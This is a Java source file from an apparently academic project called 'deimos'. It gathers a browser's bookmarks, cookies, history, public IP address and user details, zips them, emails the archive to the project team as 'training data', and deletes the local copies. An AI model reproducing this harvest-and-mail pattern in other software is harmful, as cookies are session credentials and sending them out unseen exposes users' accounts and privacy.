package deimos.phase1;

import java.io.File;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.sqlite.SQLiteException;

import deimos.common.DeimosConfig;
import deimos.common.Mailer;

/**
 * Combines all export functions,
 * Zips the output files to a single ZIP file.
 * 
 * Reference: www.mkyong.com/java/how-to-compress-files-in-zip-format/
 * 
 * @author Siddhesh Karekar
 * @author Bhushan Pathak
 * @author Amogh Bhabal
 */

public class ExportAll {
	
	/**
	 * Deletes all the files defined in DeimosConfig
	 * @return true if success, false if was unable to delete all the files.
	 */
	public static boolean deleteOutputFiles() {
		
		boolean success = true;
		
		int count_files = 0;
		
		for(String filename : DeimosConfig.FILES_OUTPUT_ALL) {
			
			File file = new File(filename);
			
			boolean result = file.delete();
			if(result) count_files++;
			success = success & result;
		}
		
		System.out.println(count_files+ " file(s) deleted.");
		
		return success;
	}
	
	
	public static void mailOutputToDeimosTeam() {

		String date = new SimpleDateFormat("dd/MM/yy HH:mm:ss").format(new Date());


		Mailer.mailToDeimosTeam("Training Data: "+date,
				"Sample body in ExportAll",
				DeimosConfig.FILE_OUTPUT_ALL_ZIP);
		
	}

	public static void main(String[] args) {
		
		ExportBookmarks.retreiveBookmarksAsFile("export-bookmarks.txt");
		
		try {
			ExportCookies.retreiveCookiesAsFile("export-cookies.txt");
		} catch (SQLiteException e) {
			
			e.printStackTrace();
		}
		
		try {
			ExportHistory.retreiveHistoryAsFile("export-history.txt");
		}
		catch (SQLiteException sle) {
			
			sle.printStackTrace();
		}
		
		try {
			ExportIP.retrievePublicIPAsFile("export-publicIP.txt");
		} catch (UnknownHostException e) {

			e.printStackTrace();
		}
		
		ExportUserInfo.retrieveUserInfoAsFile("John", "Doe",
				"male", 1995, "export-userInfo.txt");
		
		Zipper.zipOutputFiles();
		
		mailOutputToDeimosTeam();

       	System.out.println("Finished!");
		
		deleteOutputFiles();
	}

}
